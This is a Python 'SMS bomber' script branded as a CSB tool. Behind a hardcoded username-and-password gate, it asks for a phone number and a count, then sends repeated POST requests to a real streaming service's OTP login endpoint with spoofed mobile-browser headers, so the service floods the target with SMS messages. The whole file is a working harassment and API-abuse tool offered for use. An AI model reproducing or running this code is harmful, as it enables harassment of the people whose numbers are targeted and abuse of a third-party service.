import os
import time
import webbrowser
from requests.structures import CaseInsensitiveDict
import requests
from colorama import Fore, Style

def clear():
    os.system("clear")

def banner():
    print("""

██╗░░░░░░█████╗░░██████╗░██╗███╗░░██╗
██║░░░░░██╔══██╗██╔════╝░██║████╗░██║
██║░░░░░██║░░██║██║░░██╗░██║██╔██╗██║
██║░░░░░██║░░██║██║░░╚██╗██║██║╚████║
███████╗╚█████╔╝╚██████╔╝██║██║░╚███║
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝
""")
    print(Style.RESET_ALL)

def login():
    clear()
    banner()

    print(Fore.WHITE + "────────────────────────────────────────────")
  
    print(Fore.GREEN + "[•] WELCOME CSB TOOL USER")
    print(Fore.GREEN + "[•] PLEASE USERNAME AND PASSWORD") 
    print(Fore.WHITE + 
    
"────────────────────────────────────────────\n")

    REAL_USER = "team csb"
    REAL_PASS = "985543"

    user = input(Fore.WHITE + "[•] Enter Username : ")
    pwd  = input(Fore.WHITE + "[•] Enter Password : ")

    if user != REAL_USER or pwd != REAL_PASS:
        print(Fore.RED + "\n[✘] Username or Password Incorrect!")
        time.sleep(1.5)
        exit()

    print(Fore.WHITE + "\n[✓] LOGIN SUCCESS!✅")
    time.sleep(1)
  
    os.system("xdg-open 'https://www.facebook.com/mohammad.ayan.511413'")

    return "Zeru"

def dashboard(username):
    clear()
    print(r"""

░██████╗███╗░░░███╗░██████╗
██╔════╝████╗░████║██╔════╝
╚█████╗░██╔████╔██║╚█████╗░
░╚═══██╗██║╚██╔╝██║░╚═══██╗
██████╔╝██║░╚═╝░██║██████╔╝
╚═════╝░╚═╝░░░░░╚═╝╚═════╝░

██████╗░░█████╗░███╗░░░███╗██████╗░
██╔══██╗██╔══██╗████╗░████║██╔══██╗
██████╦╝██║░░██║██╔████╔██║██████╦╝
██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗
██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░
""")

    print(" CREATED BY :  𝐙𝐄𝐑𝐔 𝐏𝐇𝐀𝐍 𝐓𝐎𝐌 [𝐂𝐒𝐁 𝐒𝐓𝐔𝐃𝐄𝐍𝐓]")
    print(" TOOLS      :  𝐒𝐌𝐒 𝐁𝐎𝐌𝐁")
    print(" VERSION    :  𝟖.𝟎.𝟎  [🔥]")
    print(Fore.WHITE + "────────────────────────────────────────────")
  
    print(Fore.GREEN + "[1] Start SMS Bombing")
    
    print("[2] Exit\n")

    print(Fore.WHITE + "────────────────────────────────────────────")
  
    choice = input("Select an option : ")

    if choice == "1":
        sms_bombing()
    else:
        exit()
        
def sms_bombing():
    print("\nSMS Bombing Starting…")
    
    time.sleep(1)

def main():
    user = login()
    dashboard(user)

main()

number = input("\nEnter Number Here :- ").strip()
amount = int(input("\nEnter Amount Here :- "))

data = {
    "number": number,
    "phoneNumber": number,
    "service": "redx"
}

url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=" + number

headers = CaseInsensitiveDict()
headers["Host"] = "api-dynamic.bioscopelive.com"
headers["user-agent"] = "Mozilla/5.0 (Linux; Android 12; M2010J19CI Build/SKQ1.211202.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.122 Mobile Safari/537.36"
headers["content-type"] = "application/json"
headers["accept"] = "application/json"
headers["save-data"] = "on"
headers["sec-ch-ua-platform"] = "Android"
headers["origin"] = "https://www.bioscopeplus.com"
headers["sec-fetch-site"] = "cross-site"
headers["sec-fetch-mode"] = "cors"
headers["sec-fetch-dest"] = "empty"
headers["referer"] = "https://www.bioscopeplus.com/"
headers["accept-encoding"] = "gzip, deflate, br, zstd"
headers["accept-language"] = "en-GB,en-US;q=0.9,en;q=0.8"



for i in range(amount):
    sms = requests.post(url, headers=headers, json=data)
     
    print(f"{i+1} Send Successfully")
